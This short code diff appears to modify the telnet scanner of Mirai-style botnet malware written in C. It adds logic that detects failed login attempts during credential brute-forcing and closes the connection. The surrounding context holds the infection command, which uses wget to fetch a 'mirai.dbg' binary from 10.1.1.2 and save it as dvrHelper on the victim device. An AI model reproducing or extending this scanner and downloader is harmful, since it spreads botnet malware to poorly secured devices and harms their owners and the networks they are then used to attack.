@@ -62,6 +62,8 @@ int scanner_init(void) {
     int ro = 0;
     int inf = 0;
     
+   	int trW = 0;
+    
  
    
     int port = 23;
@@ -171,6 +173,14 @@ int scanner_init(void) {
                 		break;
                 	}
                 	ro = ro + 1;
+                }
+                if(strcmp("L",buf) == 0 && trW == 0 && ro >= 2){
+                	puts("wrong username or password\n");
+                	close(sock);
+                	break;
+                }
+                if(strcmp("W",buf) == 0){
+                	trW = 1;
                 }
                 if(strcmp("#",buf) == 0 && inf==0){
                 	char infe[49] = "wget http://10.1.1.2/bins/mirai.dbg -O dvrHelper";
